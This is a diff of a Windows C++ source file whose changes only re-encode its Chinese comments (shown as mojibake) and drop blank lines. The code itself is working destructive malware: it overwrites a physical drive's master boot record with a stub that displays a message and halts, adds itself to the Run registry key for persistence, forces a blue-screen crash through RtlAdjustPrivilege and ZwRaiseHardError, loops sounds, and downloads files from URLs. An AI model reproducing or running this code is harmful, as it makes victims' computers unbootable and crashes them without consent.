@@ -1,8 +1,8 @@
-
+ï»¿
 /*
-¼¦Éñ±£ÓÓ
-³ÌĞò°²¿µ
-ÄÚ´æ²»Òç³ö
+é¸¡ç¥ä¿ä½‘
+ç¨‹åºå®‰åº·
+å†…å­˜ä¸æº¢å‡º
 +------------------------------------------------------------------------------------------------------------------------------------------------------+
 |srssr  ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,, , ,												   |
 |sirsrr,																						   													   |
@@ -56,9 +56,6 @@
 +------------------------------------------------------------------------------------------------------------------------------------------------------+
 */
 
-
-
-
 #include"std.h"
 
 
@@ -66,67 +63,67 @@ using namespace std;
 
 bool GetPrivileges()
 {
-	HMODULE ntdll = LoadLibrary(_T("ntdll.dll"));//¼ÓÔØntdll	
+	HMODULE ntdll = LoadLibrary(_T("ntdll.dll"));//åŠ è½½ntdll	
 	if (ntdll == NULL)
 		return false;
-	FARPROC RtlAdjPriv=GetProcAddress(ntdll,"RtlAdjustPrivilege");//»ñÈ¡ÌáÈ¨º¯Êı	
+	FARPROC RtlAdjPriv=GetProcAddress(ntdll,"RtlAdjustPrivilege");//è·å–ææƒå‡½æ•°	
 	BOOLEAN ErrKill;
 	bool retn = false;
-	retn=((UINT32(*)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN))RtlAdjPriv)(0x13, TRUE, FALSE, &ErrKill)<0xc0000000;//µ÷ÓÃRtlAdjustPrivliegeº¯Êı»ñÈ¡SeShutdownPrivilegeÈ¨ÏŞ
+	retn=((UINT32(*)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN))RtlAdjPriv)(0x13, TRUE, FALSE, &ErrKill)<0xc0000000;//è°ƒç”¨RtlAdjustPrivliegeå‡½æ•°è·å–SeShutdownPrivilegeæƒé™
 	FreeLibrary(ntdll);
 	return retn;
 }
 
-//Ğ´MBR
+//å†™MBR
 bool WritePhydriveMBR(unsigned int id,const string& msgstr)
 {
 //	#pragma warning(push)
 //	#pragma warning(disable:4309 4838)
-	static BYTE pMBR[512] = { 0xB8,0x11,0x00,0xCD,0x10,0xBD,0x18,0x7C,0xB9,/*×Ö·ûÎ»Êı*/0x00,0x00,0xB8,0x01,0x13,0xBB,0x0C,0x00,0xBA,0x00,0x00,0xCD,0x10,0xEB,0xFE };
+	static BYTE pMBR[512] = { 0xB8,0x11,0x00,0xCD,0x10,0xBD,0x18,0x7C,0xB9,/*å­—ç¬¦ä½æ•°*/0x00,0x00,0xB8,0x01,0x13,0xBB,0x0C,0x00,0xBA,0x00,0x00,0xCD,0x10,0xEB,0xFE };
 //	#pragma warning(pop)
 	static bool isfirstuse = true;
 	bool retn=true;
 	if (isfirstuse)
 	{
-		//³õÊ¼»¯MBR
+		//åˆå§‹åŒ–MBR
 		
-		//¸ÄMBRÖĞ×Ö·ûÎ»Êı
+		//æ”¹MBRä¸­å­—ç¬¦ä½æ•°
 		pMBR[9] = static_cast<BYTE>(msgstr.size());
-		//¼ÓÑ­»·Âß¼­Ëø¡ª¡ª¡ª¡ªÒÑÆúÓÃ£¡£¡£¡½öWin9xÏÂÓĞĞ§¹û£¡£¡£¡
+		//åŠ å¾ªç¯é€»è¾‘é”â€”â€”â€”â€”å·²å¼ƒç”¨ï¼ï¼ï¼ä»…Win9xä¸‹æœ‰æ•ˆæœï¼ï¼ï¼
 		//pMBR[0x1BF] = 0x00;
 		//pMBR[0x1C2] = 0x05;
-		//¼Ó½áÎ²
+		//åŠ ç»“å°¾
 		pMBR[510] = static_cast<BYTE>(0x55);
 		pMBR[511] = static_cast<BYTE>(0xAA);
-		//°ÑÌáÊ¾×Ö·ûĞ´ÈëMBR
+		//æŠŠæç¤ºå­—ç¬¦å†™å…¥MBR
 		retn = strcpy_s(reinterpret_cast<char*>(pMBR + 24), 512, msgstr.c_str()) && retn;
 		isfirstuse = false;
 	}
 
-	//¼ÆËãÓ²ÅÌÎÄ¼şÃû³Æ
+	//è®¡ç®—ç¡¬ç›˜æ–‡ä»¶åç§°
 	wstringstream wss;
 	wss << _T("\\\\.\\PHYSICALDRIVE") << id << flush;
-	//´ò¿ª
+	//æ‰“å¼€
 	HANDLE hFile;
 	hFile = CreateFile(wss.str().c_str(), GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
-	//ÓÃreadfileÀ´¶ÁÈ¡MBR
+	//ç”¨readfileæ¥è¯»å–MBR
 	retn = WriteFile(hFile, pMBR, 512, NULL, NULL) == TRUE;
 	CloseHandle(hFile);
 	return retn;
 }
 
-//¶ÁMBR
+//è¯»MBR
 string ReadPhydriveMBR(unsigned int id)
 {
 	
 	char pMBR[512] = {};
 	wstringstream wss;
-	//¼ÆËãÓ²ÅÌÎÄ¼şÃû³Æ
+	//è®¡ç®—ç¡¬ç›˜æ–‡ä»¶åç§°
 	wss << _T("\\\\.\\PHYSICALDRIVE") << id << flush;
-	//´ò¿ª
+	//æ‰“å¼€
 	HANDLE hFile;
 	hFile = CreateFile(wss.str().c_str(), GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
-	//ÓÃreadfileÀ´¶ÁÈ¡MBR
+	//ç”¨readfileæ¥è¯»å–MBR
 	DWORD dwReadSize;
 	
 	bool r_flag = ReadFile(hFile, pMBR, 512, &dwReadSize, NULL) == TRUE;
@@ -138,27 +135,27 @@ string ReadPhydriveMBR(unsigned int id)
 }
 
 
-//×¢²á×ÔÆô¶¯
+//æ³¨å†Œè‡ªå¯åŠ¨
 bool RegAutoStart(const wstring& name)
 {
 	HKEY hKey;
 	const TCHAR *strRegPath = _T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
-	//1¡¢ÕÒµ½ÏµÍ³µÄÆô¶¯Ïî  
-	if (RegOpenKeyEx(HKEY_CURRENT_USER, strRegPath, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) ///´ò¿ªÆô¶¯Ïî       
+	//1ã€æ‰¾åˆ°ç³»ç»Ÿçš„å¯åŠ¨é¡¹  
+	if (RegOpenKeyEx(HKEY_CURRENT_USER, strRegPath, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) ///æ‰“å¼€å¯åŠ¨é¡¹       
 	{
-		//2¡¢µÃµ½±¾³ÌĞò×ÔÉíµÄÈ«Â·¾¶
+		//2ã€å¾—åˆ°æœ¬ç¨‹åºè‡ªèº«çš„å…¨è·¯å¾„
 		TCHAR strExeFullDir[MAX_PATH];
 		GetModuleFileName(NULL, strExeFullDir, MAX_PATH);
-		//3¡¢ÅĞ¶Ï×¢²á±íÏîÊÇ·ñÒÑ¾­´æÔÚ
+		//3ã€åˆ¤æ–­æ³¨å†Œè¡¨é¡¹æ˜¯å¦å·²ç»å­˜åœ¨
 		TCHAR strDir[MAX_PATH] = {};
 		DWORD nLength = MAX_PATH;
-		//4¡¢ÒÑ¾­´æÔÚ
+		//4ã€å·²ç»å­˜åœ¨
 		if (RegGetValue(hKey, nullptr, name.c_str(), RRF_RT_REG_SZ, 0, strDir, &nLength) != ERROR_SUCCESS || _tcscmp(strExeFullDir, strDir) != 0)
 		{
 			bool retn = false;
-			//5¡¢Ìí¼ÓÒ»¸ö×ÓKey,²¢ÉèÖÃÖµ
+			//5ã€æ·»åŠ ä¸€ä¸ªå­Key,å¹¶è®¾ç½®å€¼
 			retn=RegSetValueEx(hKey, name.c_str(), 0, REG_SZ, (LPBYTE)strExeFullDir, (lstrlen(strExeFullDir) + 1) * sizeof(TCHAR)) == ERROR_SUCCESS;
-			//6¡¢¹Ø±Õ×¢²á±í
+			//6ã€å…³é—­æ³¨å†Œè¡¨
 			RegCloseKey(hKey);
 			return retn;
 		}
@@ -168,7 +165,7 @@ bool RegAutoStart(const wstring& name)
 	return false;
 }
 
-//À¶ÆÁº¯Êı
+//è“å±å‡½æ•°
 bool MakeBlueScreen(unsigned int errid)
 {
 	HMODULE ntdll = LoadLibrary(_T("ntdll.dll"));
@@ -176,7 +173,7 @@ bool MakeBlueScreen(unsigned int errid)
 	{
 		FARPROC RtlAdjPriv = GetProcAddress(ntdll, "RtlAdjustPrivilege");
 		FARPROC RtlSetProcessIsCritical = GetProcAddress(ntdll, "RtlSetProcessIsCritical");
-		FARPROC ZwRaiseHardErr = GetProcAddress(ntdll, "ZwRaiseHardError");//»ñÈ¡À¶ÆÁº¯Êı
+		FARPROC ZwRaiseHardErr = GetProcAddress(ntdll, "ZwRaiseHardError");//è·å–è“å±å‡½æ•°
 		unsigned char ErrKill;
 		long unsigned int HDErr;
 		((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjPriv)(0x13, true, false, &ErrKill);
@@ -186,7 +183,7 @@ bool MakeBlueScreen(unsigned int errid)
 	return false;
 }
 
-//²¥·ÅÉùÒô
+//æ’­æ”¾å£°éŸ³
 bool PlaySoundFile(const wstring& soundname,bool sync)
 {
 	return PlaySound(soundname.c_str(), NULL, SND_FILENAME | SND_NODEFAULT | (sync ? SND_SYNC : SND_ASYNC) | SND_LOOP) == TRUE;
@@ -198,13 +195,13 @@ bool DownloadFileFromURL(const std::wstring& url, const std::wstring& filepath)
 }
 
 
-//´ÓURL»ñÈ¡×Ö·û´®
+//ä»URLè·å–å­—ç¬¦ä¸²
 std::wstring GetDataFromURL(const std::wstring& url, bool& isok)
 {
 	CInternetSession session;
 	CHttpFile* file = NULL;
 	CString strURL = url.c_str();//URL
-	CString strHtml = _T("");	//´æ·ÅÍøÒ³Êı¾İ
+	CString strHtml = _T("");	//å­˜æ”¾ç½‘é¡µæ•°æ®
 	try
 	{
 		file = (CHttpFile*)session.OpenURL(strURL);
@@ -241,9 +238,9 @@ std::wstring GetDataFromURL(const std::wstring& url, bool& isok)
 }
 
 /*
-¼¦Éñ±£ÓÓ
-³ÌĞò°²¿µ
-ÄÚ´æ²»Òç³ö
+é¸¡ç¥ä¿ä½‘
+ç¨‹åºå®‰åº·
+å†…å­˜ä¸æº¢å‡º
 +------------------------------------------------------------------------------------------------------------------------------------------------------+
 |srssr  ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,, , ,												   |
 |sirsrr,																						   													   |
